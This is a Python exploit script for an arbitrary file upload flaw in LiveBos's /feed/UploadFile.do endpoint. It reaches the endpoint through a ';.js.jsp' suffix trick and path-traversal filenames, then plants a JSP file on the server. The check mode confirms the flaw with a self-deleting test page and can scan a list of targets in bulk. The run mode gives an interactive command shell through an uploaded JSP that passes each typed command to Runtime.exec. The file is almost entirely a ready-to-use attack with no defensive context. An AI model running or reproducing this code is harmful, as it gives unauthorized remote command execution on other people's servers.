import requests
import urllib3
import re,string,random
from urllib.parse import urljoin
import argparse
import time
import ssl
import urllib.request
import random
import string
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = url+"/feed/UploadFile.do;.js.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=---------------------------11d2c49c8ddda2a65a0a90c3b02189a3"
    }

    data="""-----------------------------11d2c49c8ddda2a65a0a90c3b02189a3\r\nContent-Disposition: form-data; name="file"; filename="//../../../../tmptest1.jsp"\r\nContent-Type: image/png\r\n\r\n<% out.println("HelloWorldTest");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n-----------------------------11d2c49c8ddda2a65a0a90c3b02189a3""".encode('utf-8')
    try:
        response = urllib.request.Request(target, headers=headers, data=data, method="POST", unverifiable=True)
        res = urllib.request.urlopen(response)
        upload_status_code = res.getcode()
        upload_content = res.read().decode()
        if upload_status_code == 200 and 'oldfileName' in upload_content and 'newFileName' in upload_content:
            result_url = url + '/tmptest1.jsp;.js.jsp'
            result_response = urllib.request.Request(result_url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"}, method="GET", unverifiable=True)
            res = urllib.request.urlopen(result_response)
            result_status_code = res.getcode()
            result_content = res.read().decode()
            if result_status_code == 200 and 'HelloWorldTest' in result_content:
                print(f"\033[31mDiscovered:{url}: LiveBos_UploadFile_ArbiraryFileUpload!\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    target = url + "/feed/UploadFile.do;.js.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=---------------------------11d2c49c8ddda2a65a0a90c3b02189a3"
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            if "exit" not in command:
                filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
                data = """-----------------------------11d2c49c8ddda2a65a0a90c3b02189a3\r\nContent-Disposition: form-data; name="file"; filename="//../../../../replace1.jsp"\r\nContent-Type: image/png\r\n\r\n<% java.io.InputStream in = Runtime.getRuntime().exec(\"replace2\").getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n-----------------------------11d2c49c8ddda2a65a0a90c3b02189a3"""
                data = data.replace('replace1',filename).replace('replace2',command).encode('utf-8')
                try:
                    response = urllib.request.Request(target, headers=headers, data=data, method="POST",unverifiable=True)
                    res = urllib.request.urlopen(response)
                    upload_status_code = res.getcode()
                    upload_content = res.read().decode()
                    if upload_status_code == 200 and 'oldfileName' in upload_content and 'newFileName' in upload_content:
                        result_url = url + '/{}.jsp;.js.jsp'.format(filename)
                        result_response = urllib.request.Request(result_url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"},method="GET", unverifiable=True)
                        res = urllib.request.urlopen(result_response)
                        result_status_code = res.getcode()
                        result_content = res.read().decode()
                        if result_status_code == 200:
                            print(result_content)
                except Exception as e:
                    pass
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")